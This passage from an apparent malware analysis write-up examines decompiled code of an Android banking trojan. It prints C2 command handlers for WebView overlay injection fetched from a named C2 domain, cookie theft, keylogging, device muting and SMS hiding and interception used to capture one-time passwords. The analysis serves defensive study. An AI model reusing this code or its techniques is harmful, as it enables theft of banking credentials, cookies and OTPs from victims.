        <span class="k">if</span><span class="p">(</span><span class="n">boolean0</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">this</span><span class="p">.</span><span class="nf">prefsEditor</span><span class="p">().</span><span class="nf">putBoolean</span><span class="p">(</span><span class="s">"is2FAActivatorEnabled"</span><span class="p">,</span> <span class="n">boolean0</span><span class="p">.</span><span class="nf">booleanValue</span><span class="p">()).</span><span class="nf">apply</span><span class="p">();</span>
            <span class="k">return</span> <span class="n">boolean0</span><span class="p">.</span><span class="nf">booleanValue</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nf">prefs</span><span class="p">().</span><span class="nf">getBoolean</span><span class="p">(</span><span class="s">"is2FAActivatorEnabled"</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">static</span> <span class="n">boolean</span> <span class="n">is2FAActivatorEnabled</span><span class="err">$</span><span class="k">default</span><span class="p">(</span><span class="n">Preferences</span> <span class="n">preferences0</span><span class="p">,</span> <span class="n">Boolean</span> <span class="n">boolean0</span><span class="p">,</span> <span class="kt">int</span> <span class="n">v</span><span class="p">,</span> <span class="n">Object</span> <span class="n">object0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="n">object0</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span><span class="p">((</span><span class="n">v</span> <span class="p">&amp;</span> <span class="m">1</span><span class="p">)</span> <span class="p">!=</span> <span class="m">0</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">boolean0</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="k">return</span> <span class="n">preferences0</span><span class="p">.</span><span class="nf">is2FAActivatorEnabled</span><span class="p">(</span><span class="n">boolean0</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">throw</span> <span class="k">new</span> <span class="nf">UnsupportedOperationException</span><span class="p">(</span><span class="s">"Super calls with default arguments not supported in this target, function: is2FAActivatorEnabled"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="n">final</span> <span class="n">boolean</span> <span class="nf">is2FARequested</span><span class="p">(</span><span class="n">Boolean</span> <span class="n">boolean0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="n">boolean0</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">this</span><span class="p">.</span><span class="nf">prefsEditor</span><span class="p">().</span><span class="nf">putBoolean</span><span class="p">(</span><span class="s">"is2FARequested"</span><span class="p">,</span> <span class="n">boolean0</span><span class="p">.</span><span class="nf">booleanValue</span><span class="p">()).</span><span class="nf">apply</span><span class="p">();</span>
            <span class="k">return</span> <span class="n">boolean0</span><span class="p">.</span><span class="nf">booleanValue</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nf">prefs</span><span class="p">().</span><span class="nf">getBoolean</span><span class="p">(</span><span class="s">"is2FARequested"</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">static</span> <span class="n">boolean</span> <span class="n">is2FARequested</span><span class="err">$</span><span class="k">default</span><span class="p">(</span><span class="n">Preferences</span> <span class="n">preferences0</span><span class="p">,</span> <span class="n">Boolean</span> <span class="n">boolean0</span><span class="p">,</span> <span class="kt">int</span> <span class="n">v</span><span class="p">,</span> <span class="n">Object</span> <span class="n">object0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="n">object0</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span><span class="p">((</span><span class="n">v</span> <span class="p">&amp;</span> <span class="m">1</span><span class="p">)</span> <span class="p">!=</span> <span class="m">0</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">boolean0</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="k">return</span> <span class="n">preferences0</span><span class="p">.</span><span class="nf">is2FARequested</span><span class="p">(</span><span class="n">boolean0</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">throw</span> <span class="k">new</span> <span class="nf">UnsupportedOperationException</span><span class="p">(</span><span class="s">"Super calls with default arguments not supported in this target, function: is2FARequested"</span><span class="p">);</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>The malware will perform overlay attack when the victim opens a specific app usually banking apps or cryptocurrency apps to steal the victim’s credentials. In prevouis versions, the malware puts targeted apps in <code class="language-plaintext highlighter-rouge">packageList.txt</code> in <code class="language-plaintext highlighter-rouge">assets/</code> folder. In version 5, the malware will request all installed packages on the victim’s device, and then reqest needed WebViews for targeted apps. The command <code class="language-plaintext highlighter-rouge">openinject</code> will open the downloaded WebView by requesting <code class="language-plaintext highlighter-rouge">injectlist</code> from the C2 server <code class="language-plaintext highlighter-rouge">satandemantenimiento[].]com</code> when a targeted app opened. The malware knows that the vicitm opens a targeted app by monitoring the screen.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span><span class="p">(</span><span class="n">Intrinsics</span><span class="p">.</span><span class="nf">areEqual</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">"openinject"</span><span class="p">))</span> <span class="p">{</span>
                            <span class="n">Companion</span> <span class="n">browserActivity</span><span class="err">$</span><span class="n">Companion0</span> <span class="p">=</span> <span class="n">BrowserActivity</span><span class="p">.</span><span class="n">Companion</span><span class="p">;</span>
                            <span class="n">Context</span> <span class="n">context7</span> <span class="p">=</span> <span class="n">workerService0</span><span class="p">.</span><span class="nf">getApplicationContext</span><span class="p">();</span>
                            <span class="n">Intrinsics</span><span class="p">.</span><span class="nf">checkNotNullExpressionValue</span><span class="p">(</span><span class="n">context7</span><span class="p">,</span> <span class="s">"workerService.applicationContext"</span><span class="p">);</span>
                            <span class="n">StringBuilder</span> <span class="n">stringBuilder0</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">StringBuilder</span><span class="p">().</span><span class="nf">append</span><span class="p">(</span><span class="s">"http://satandemantenimiento.com"</span><span class="p">).</span><span class="nf">append</span><span class="p">(</span><span class="s">"/downloadinject?access="</span><span class="p">).</span><span class="nf">append</span><span class="p">(</span><span class="s">"1"</span><span class="p">).</span><span class="nf">append</span><span class="p">(</span><span class="s">"&amp;packagename="</span><span class="p">);</span>
                            <span class="n">List</span> <span class="n">list0</span> <span class="p">=</span> <span class="n">command0</span><span class="p">.</span><span class="nf">getInjectlist</span><span class="p">();</span>
                            <span class="k">if</span><span class="p">(</span><span class="n">list0</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
                                <span class="n">inject0</span> <span class="p">=</span> <span class="p">(</span><span class="n">Inject</span><span class="p">)</span><span class="n">list0</span><span class="p">.</span><span class="k">get</span><span class="p">(</span><span class="m">0</span><span class="p">);</span>
                            <span class="p">}</span>

                            <span class="n">Intrinsics</span><span class="p">.</span><span class="nf">checkNotNull</span><span class="p">(</span><span class="n">inject0</span><span class="p">);</span>
                            <span class="n">workerService1</span><span class="p">.</span><span class="nf">startActivity</span><span class="p">(</span><span class="n">browserActivity</span><span class="err">$</span><span class="n">Companion0</span><span class="p">.</span><span class="nf">newInstance</span><span class="p">(</span><span class="n">context7</span><span class="p">,</span> <span class="n">stringBuilder0</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">inject0</span><span class="p">.</span><span class="nf">getPacket</span><span class="p">()).</span><span class="nf">append</span><span class="p">(</span><span class="s">"&amp;type=html"</span><span class="p">).</span><span class="nf">toString</span><span class="p">(),</span> <span class="p">((</span><span class="n">Inject</span><span class="p">)</span><span class="n">command0</span><span class="p">.</span><span class="nf">getInjectlist</span><span class="p">().</span><span class="k">get</span><span class="p">(</span><span class="m">0</span><span class="p">)).</span><span class="nf">getGetcookie</span><span class="p">(),</span> <span class="p">((</span><span class="n">Inject</span><span class="p">)</span><span class="n">command0</span><span class="p">.</span><span class="nf">getInjectlist</span><span class="p">().</span><span class="k">get</span><span class="p">(</span><span class="m">0</span><span class="p">)).</span><span class="nf">getPacket</span><span class="p">()).</span><span class="nf">addFlags</span><span class="p">(</span><span class="m">0x10000000</span><span class="p">));</span>
                            <span class="k">return</span><span class="p">;</span>
                        <span class="p">}</span>
 <span class="k">if</span><span class="p">(</span><span class="n">Intrinsics</span><span class="p">.</span><span class="nf">areEqual</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">"enableinject"</span><span class="p">))</span> <span class="p">{</span>
                                <span class="k">this</span><span class="p">.</span><span class="nf">scanInject</span><span class="p">(</span><span class="n">command0</span><span class="p">,</span> <span class="n">workerService0</span><span class="p">);</span>
                                <span class="k">return</span><span class="p">;</span>
                            <span class="p">}</span>
 <span class="k">if</span><span class="p">(</span><span class="n">Intrinsics</span><span class="p">.</span><span class="nf">areEqual</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">"disableinject"</span><span class="p">))</span> <span class="p">{</span>
                                <span class="n">Preferences</span> <span class="n">preferences1</span> <span class="p">=</span> <span class="n">workerService0</span><span class="p">.</span><span class="nf">getPreferences</span><span class="p">();</span>
                                <span class="n">List</span> <span class="n">list1</span> <span class="p">=</span> <span class="n">command0</span><span class="p">.</span><span class="nf">getInjectlist</span><span class="p">();</span>
                                <span class="n">Intrinsics</span><span class="p">.</span><span class="nf">checkNotNull</span><span class="p">(</span><span class="n">list1</span><span class="p">);</span>
                                <span class="n">preferences1</span><span class="p">.</span><span class="nf">deleteInjects</span><span class="p">(</span><span class="n">list1</span><span class="p">);</span>
                                <span class="k">return</span><span class="p">;</span>
</code></pre></div></div>
<p>And the <code class="language-plaintext highlighter-rouge">scanInject</code> class to update the list of targeted apps.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">private</span> <span class="n">final</span> <span class="k">void</span> <span class="nf">scanInject</span><span class="p">(</span><span class="n">Command</span> <span class="n">command0</span><span class="p">,</span> <span class="n">WorkerService</span> <span class="n">workerService0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">Log</span><span class="p">.</span><span class="nf">d</span><span class="p">(</span><span class="s">"INJCTS - scan"</span><span class="p">,</span> <span class="n">String</span><span class="p">.</span><span class="nf">valueOf</span><span class="p">(</span><span class="n">command0</span><span class="p">.</span><span class="nf">getInjectlist</span><span class="p">()));</span>
        <span class="k">for</span><span class="p">(</span><span class="n">Object</span> <span class="n">object0</span><span class="p">:</span> <span class="p">(</span><span class="n">command0</span><span class="p">.</span><span class="nf">getInjectlist</span><span class="p">()</span> <span class="p">==</span> <span class="k">null</span> <span class="p">?</span> <span class="n">CollectionsKt</span><span class="p">.</span><span class="nf">emptyList</span><span class="p">()</span> <span class="p">:</span> <span class="n">command0</span><span class="p">.</span><span class="nf">getInjectlist</span><span class="p">()))</span> <span class="p">{</span>
            <span class="n">Inject</span> <span class="n">inject0</span> <span class="p">=</span> <span class="p">(</span><span class="n">Inject</span><span class="p">)</span><span class="n">object0</span><span class="p">;</span>
            <span class="n">workerService0</span><span class="p">.</span><span class="nf">getPreferences</span><span class="p">().</span><span class="nf">addInject</span><span class="p">(</span><span class="n">inject0</span><span class="p">);</span>
            <span class="n">AppKt</span><span class="p">.</span><span class="n">log</span><span class="err">$</span><span class="k">default</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="n">inject0</span> <span class="p">+</span> <span class="s">" ENABLED"</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="m">6</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>This how malware perform overlay attack. And the malware will try to steal <code class="language-plaintext highlighter-rouge">cookie</code> using <code class="language-plaintext highlighter-rouge">getCookie</code> command -which we will explain- using <code class="language-plaintext highlighter-rouge">cookieManager</code>.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">protected</span> <span class="k">void</span> <span class="nf">onCreate</span><span class="p">(</span><span class="n">Bundle</span> <span class="n">bundle0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">super</span><span class="p">.</span><span class="nf">onCreate</span><span class="p">(</span><span class="n">bundle0</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="nf">getWindow</span><span class="p">().</span><span class="nf">requestFeature</span><span class="p">(</span><span class="m">8</span><span class="p">);</span>
        <span class="n">ActionBar</span> <span class="n">actionBar0</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="nf">getActionBar</span><span class="p">();</span>
        <span class="k">if</span><span class="p">(</span><span class="n">actionBar0</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">actionBar0</span><span class="p">.</span><span class="nf">hide</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">this</span><span class="p">.</span><span class="nf">setTitle</span><span class="p">(</span><span class="s">""</span><span class="p">);</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="k">this</span><span class="p">.</span><span class="nf">setContentView</span><span class="p">(</span><span class="m">0x7F0B0022</span><span class="p">);</span>
            <span class="n">View</span> <span class="n">view0</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="nf">findViewById</span><span class="p">(</span><span class="m">0x7F0800B8</span><span class="p">);</span>
            <span class="n">Intrinsics</span><span class="p">.</span><span class="nf">checkNotNullExpressionValue</span><span class="p">(</span><span class="n">view0</span><span class="p">,</span> <span class="s">"findViewById(R.id.web_view)"</span><span class="p">);</span>
            <span class="n">WebView</span> <span class="n">webView0</span> <span class="p">=</span> <span class="p">(</span><span class="n">WebView</span><span class="p">)</span><span class="n">view0</span><span class="p">;</span>
            <span class="n">webView0</span><span class="p">.</span><span class="nf">getSettings</span><span class="p">().</span><span class="nf">setJavaScriptEnabled</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
            <span class="n">String</span> <span class="n">s</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
            <span class="n">webView0</span><span class="p">.</span><span class="nf">setLayerType</span><span class="p">(</span><span class="m">2</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
            <span class="n">String</span> <span class="n">s1</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="nf">getIntent</span><span class="p">().</span><span class="nf">getStringExtra</span><span class="p">(</span><span class="s">"link"</span><span class="p">);</span>
            <span class="n">Log</span><span class="p">.</span><span class="nf">i</span><span class="p">(</span><span class="s">"INJECT_URL"</span><span class="p">,</span> <span class="n">Intrinsics</span><span class="p">.</span><span class="nf">stringPlus</span><span class="p">(</span><span class="s">""</span><span class="p">,</span> <span class="n">s1</span><span class="p">));</span>
            <span class="n">boolean</span> <span class="n">z</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="nf">getIntent</span><span class="p">().</span><span class="nf">getBooleanExtra</span><span class="p">(</span><span class="s">"getCookie"</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span>
            <span class="k">this</span><span class="p">.</span><span class="n">packet</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="nf">getIntent</span><span class="p">().</span><span class="nf">getStringExtra</span><span class="p">(</span><span class="s">"packet"</span><span class="p">);</span>
            <span class="n">StringBuilder</span> <span class="n">stringBuilder0</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">StringBuilder</span><span class="p">().</span><span class="nf">append</span><span class="p">(</span><span class="s">"Web activity started. Navigate to: "</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="n">s1</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">s</span> <span class="p">=</span> <span class="n">s1</span><span class="p">.</span><span class="nf">toString</span><span class="p">();</span>
            <span class="p">}</span>

            <span class="n">AppKt</span><span class="p">.</span><span class="n">log</span><span class="err">$</span><span class="k">default</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="n">stringBuilder0</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">s</span><span class="p">).</span><span class="nf">append</span><span class="p">(</span><span class="s">". Get cookie: "</span><span class="p">).</span><span class="nf">append</span><span class="p">(((</span><span class="n">boolean</span><span class="p">)(((</span><span class="kt">int</span><span class="p">)</span><span class="n">z</span><span class="p">)))).</span><span class="nf">toString</span><span class="p">(),</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="m">6</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
            <span class="n">CookieManager</span> <span class="n">cookieManager0</span> <span class="p">=</span> <span class="n">CookieManager</span><span class="p">.</span><span class="nf">getInstance</span><span class="p">();</span>
            <span class="n">CookieSyncManager</span><span class="p">.</span><span class="nf">createInstance</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nf">getApplicationContext</span><span class="p">());</span>
            <span class="k">if</span><span class="p">(</span><span class="n">Build</span><span class="p">.</span><span class="n">VERSION</span><span class="p">.</span><span class="n">SDK_INT</span> <span class="p">&gt;=</span> <span class="m">21</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">cookieManager0</span><span class="p">.</span><span class="nf">setAcceptThirdPartyCookies</span><span class="p">(</span><span class="n">webView0</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">else</span> <span class="p">{</span>
                <span class="n">cookieManager0</span><span class="p">.</span><span class="nf">setAcceptCookie</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
            <span class="p">}</span>

            <span class="n">cookieManager0</span><span class="p">.</span><span class="nf">acceptCookie</span><span class="p">();</span>
            <span class="n">CookieSyncManager</span><span class="p">.</span><span class="nf">getInstance</span><span class="p">().</span><span class="nf">startSync</span><span class="p">();</span>
            <span class="n">Intrinsics</span><span class="p">.</span><span class="nf">checkNotNullExpressionValue</span><span class="p">(</span><span class="n">cookieManager0</span><span class="p">,</span> <span class="s">"cookieManager"</span><span class="p">);</span>
            <span class="k">this</span><span class="p">.</span><span class="nf">setClient</span><span class="p">(</span><span class="n">webView0</span><span class="p">,</span> <span class="p">((</span><span class="n">boolean</span><span class="p">)(((</span><span class="kt">int</span><span class="p">)</span><span class="n">z</span><span class="p">))),</span> <span class="n">cookieManager0</span><span class="p">);</span>
            <span class="k">this</span><span class="p">.</span><span class="nf">setChromeClient</span><span class="p">(</span><span class="n">webView0</span><span class="p">);</span>
            <span class="n">webView0</span><span class="p">.</span><span class="nf">getSettings</span><span class="p">().</span><span class="nf">setDomStorageEnabled</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
            <span class="n">webView0</span><span class="p">.</span><span class="nf">addJavascriptInterface</span><span class="p">(</span><span class="k">new</span> <span class="n">BrowserActivity</span><span class="p">.</span><span class="n">onCreate</span><span class="p">.</span><span class="m">1</span><span class="p">(</span><span class="k">this</span><span class="p">),</span> <span class="s">"Android"</span><span class="p">);</span>
            <span class="n">webView0</span><span class="p">.</span><span class="nf">addJavascriptInterface</span><span class="p">(</span><span class="k">new</span> <span class="n">BrowserActivity</span><span class="p">.</span><span class="n">onCreate</span><span class="p">.</span><span class="m">2</span><span class="p">(),</span> <span class="s">"recorder"</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="n">s1</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">webView0</span><span class="p">.</span><span class="nf">loadUrl</span><span class="p">(</span><span class="n">s1</span><span class="p">);</span>
                <span class="k">return</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">catch</span><span class="p">(</span><span class="n">Exception</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>The malware will steal Cookies from the opened apps using <code class="language-plaintext highlighter-rouge">scancookie</code> using <code class="language-plaintext highlighter-rouge">cookieManager</code>. After collecting Cookies the malware will stop scan using <code class="language-plaintext highlighter-rouge">stopcookie</code> command. The malware sends the stolen Cookies to <code class="language-plaintext highlighter-rouge">/testpost.php</code>.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span><span class="p">(</span><span class="n">Intrinsics</span><span class="p">.</span><span class="nf">areEqual</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">"scancookie"</span><span class="p">))</span> <span class="p">{</span>
                        <span class="k">try</span> <span class="p">{</span>
                            <span class="k">this</span><span class="p">.</span><span class="nf">scanCookie</span><span class="p">(</span><span class="n">command0</span><span class="p">,</span> <span class="n">workerService0</span><span class="p">);</span>
                        <span class="p">}</span>
                        <span class="k">catch</span><span class="p">(</span><span class="n">Exception</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
                        <span class="p">}</span>

                        <span class="k">return</span><span class="p">;</span>
                    <span class="p">}</span>
<span class="k">if</span><span class="p">(</span><span class="n">Intrinsics</span><span class="p">.</span><span class="nf">areEqual</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">"stopcookie"</span><span class="p">))</span> <span class="p">{</span>
                        <span class="n">AppKt</span><span class="p">.</span><span class="n">log</span><span class="err">$</span><span class="k">default</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="s">"stop cookie received. cleaning preferences ..."</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="m">6</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
                        <span class="n">workerService0</span><span class="p">.</span><span class="nf">getPreferences</span><span class="p">().</span><span class="nf">currentCookie</span><span class="p">(</span><span class="s">"[]"</span><span class="p">);</span>
                        <span class="k">return</span><span class="p">;</span>
                    <span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="n">Intrinsics</span><span class="p">.</span><span class="nf">areEqual</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">"stopscan"</span><span class="p">))</span> <span class="p">{</span>
                        <span class="n">workerService0</span><span class="p">.</span><span class="nf">getPreferences</span><span class="p">().</span><span class="nf">currentCookie</span><span class="p">(</span><span class="s">"[]"</span><span class="p">);</span>
                        <span class="k">return</span><span class="p">;</span>
                    <span class="p">}</span>

</code></pre></div></div>
<p>The malware has the capabbility to store key strokes of the victim using <code class="language-plaintext highlighter-rouge">startkeylogs</code>. This helps to steal the victim’s banking credentials or login credentials. The malware sends the stored keylogs to <code class="language-plaintext highlighter-rouge">/keylog.php</code>. And stop storing keylogs using <code class="language-plaintext highlighter-rouge">stopkeylogs</code>.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">if</span><span class="p">(</span><span class="n">Intrinsics</span><span class="p">.</span><span class="nf">areEqual</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">"stopkeylogs"</span><span class="p">))</span> <span class="p">{</span>
                        <span class="n">preferences0</span><span class="p">.</span><span class="nf">isKeyLoggerIsEnabled</span><span class="p">(</span><span class="n">Boolean</span><span class="p">.</span><span class="nf">valueOf</span><span class="p">(</span><span class="k">false</span><span class="p">));</span>
                        <span class="k">return</span><span class="p">;</span>
                    <span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="n">Intrinsics</span><span class="p">.</span><span class="nf">areEqual</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">"startkeylogs"</span><span class="p">))</span> <span class="p">{</span>
                        <span class="n">preferences0</span><span class="p">.</span><span class="nf">isKeyLoggerIsEnabled</span><span class="p">(</span><span class="n">boolean0</span><span class="p">);</span>
                        <span class="k">return</span><span class="p">;</span>
                    <span class="p">}</span>

</code></pre></div></div>

<p>The malware will set the device to mute state using <code class="language-plaintext highlighter-rouge">startmute</code> command. So when the device gets a notification the victim won’t notice. Then the malware will intercept the coming SMS. This makes the received SMS hidden from the victim. This useful for the attacker to get OTP. By using <code class="language-plaintext highlighter-rouge">stophidesms</code> command, this command stops hidding received SMS. Another command is to get SMS <code class="language-plaintext highlighter-rouge">getsms</code> to get the stored SMS on the victim’s device then upload to C2 server using <code class="language-plaintext highlighter-rouge">sendsms</code> command.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="n">Intrinsics</span><span class="p">.</span><span class="nf">areEqual</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">"stophidesms"</span><span class="p">))</span> <span class="p">{</span>
                    <span class="k">if</span><span class="p">(!</span><span class="n">workerService1</span><span class="p">.</span><span class="nf">checkScreenState</span><span class="p">(</span><span class="n">command0</span><span class="p">))</span> <span class="p">{</span>
                        <span class="k">return</span><span class="p">;</span>
                    <span class="p">}</span>

                    <span class="k">if</span><span class="p">(</span><span class="n">Intrinsics</span><span class="p">.</span><span class="nf">areEqual</span><span class="p">(</span><span class="n">Telephony</span><span class="p">.</span><span class="n">Sms</span><span class="p">.</span><span class="nf">getDefaultSmsPackage</span><span class="p">(</span><span class="n">context0</span><span class="p">),</span> <span class="n">workerService0</span><span class="p">.</span><span class="nf">getPackageName</span><span class="p">()))</span> <span class="p">{</span>
                        <span class="n">preferences0</span><span class="p">.</span><span class="nf">loopnotifEnabled</span><span class="p">(</span><span class="n">Boolean</span><span class="p">.</span><span class="nf">valueOf</span><span class="p">(</span><span class="k">false</span><span class="p">));</span>
                        <span class="k">this</span><span class="p">.</span><span class="nf">stopHiddenPush</span><span class="p">(</span><span class="n">workerService1</span><span class="p">);</span>
                        <span class="n">workerService0</span><span class="p">.</span><span class="nf">getPreferences</span><span class="p">().</span><span class="nf">isHiddenSMSEnabled</span><span class="p">(</span><span class="n">Boolean</span><span class="p">.</span><span class="nf">valueOf</span><span class="p">(</span><span class="k">false</span><span class="p">));</span>
                        <span class="n">workerService0</span><span class="p">.</span><span class="nf">getPreferences</span><span class="p">().</span><span class="nf">isNeedChangeDefaultToChrome</span><span class="p">(</span><span class="k">false</span><span class="p">);</span>
                        <span class="n">workerService0</span><span class="p">.</span><span class="nf">getPreferences</span><span class="p">().</span><span class="nf">isNeedChangeDefaultToMessages</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
                        <span class="n">Context</span> <span class="n">context3</span> <span class="p">=</span> <span class="n">workerService0</span><span class="p">.</span><span class="nf">getApplicationContext</span><span class="p">();</span>
                        <span class="n">Intrinsics</span><span class="p">.</span><span class="nf">checkNotNullExpressionValue</span><span class="p">(</span><span class="n">context3</span><span class="p">,</span> <span class="s">"workerService.applicationContext"</span><span class="p">);</span>
                        <span class="k">if</span><span class="p">(!</span><span class="n">ContexStartExtensionsKt</span><span class="p">.</span><span class="nf">startApp</span><span class="p">(</span><span class="n">context3</span><span class="p">,</span> <span class="s">"com.samsung.android.messaging"</span><span class="p">))</span> <span class="p">{</span>
                            <span class="n">Context</span> <span class="n">context4</span> <span class="p">=</span> <span class="n">workerService0</span><span class="p">.</span><span class="nf">getApplicationContext</span><span class="p">();</span>
                            <span class="n">Intrinsics</span><span class="p">.</span><span class="nf">checkNotNullExpressionValue</span><span class="p">(</span><span class="n">context4</span><span class="p">,</span> <span class="s">"workerService.applicationContext"</span><span class="p">);</span>
                            <span class="k">if</span><span class="p">(!</span><span class="n">ContexStartExtensionsKt</span><span class="p">.</span><span class="nf">startApp</span><span class="p">(</span><span class="n">context4</span><span class="p">,</span> <span class="s">"com.android.messaging"</span><span class="p">))</span> <span class="p">{</span>
                                <span class="n">Context</span> <span class="n">context5</span> <span class="p">=</span> <span class="n">workerService0</span><span class="p">.</span><span class="nf">getApplicationContext</span><span class="p">();</span>
                                <span class="n">Intrinsics</span><span class="p">.</span><span class="nf">checkNotNullExpressionValue</span><span class="p">(</span><span class="n">context5</span><span class="p">,</span> <span class="s">"workerService.applicationContext"</span><span class="p">);</span>
                                <span class="k">if</span><span class="p">(!</span><span class="n">ContexStartExtensionsKt</span><span class="p">.</span><span class="nf">startApp</span><span class="p">(</span><span class="n">context5</span><span class="p">,</span> <span class="s">"com.google.android.apps.messaging"</span><span class="p">))</span> <span class="p">{</span>
                                    <span class="n">Context</span> <span class="n">context6</span> <span class="p">=</span> <span class="n">workerService0</span><span class="p">.</span><span class="nf">getApplicationContext</span><span class="p">();</span>
                                    <span class="n">Intrinsics</span><span class="p">.</span><span class="nf">checkNotNullExpressionValue</span><span class="p">(</span><span class="n">context6</span><span class="p">,</span> <span class="s">"workerService.applicationContext"</span><span class="p">);</span>
                                    <span class="n">ContexStartExtensionsKt</span><span class="p">.</span><span class="nf">startApp</span><span class="p">(</span><span class="n">context6</span><span class="p">,</span> <span class="s">"com.android.mms"</span><span class="p">);</span>
                                    <span class="k">return</span><span class="p">;</span>
                                <span class="p">}</span>
                            <span class="p">}</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                <span class="p">}</span>        
<span class="k">if</span><span class="p">(</span><span class="n">Intrinsics</span><span class="p">.</span><span class="nf">areEqual</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">"getsms"</span><span class="p">))</span> <span class="p">{</span>
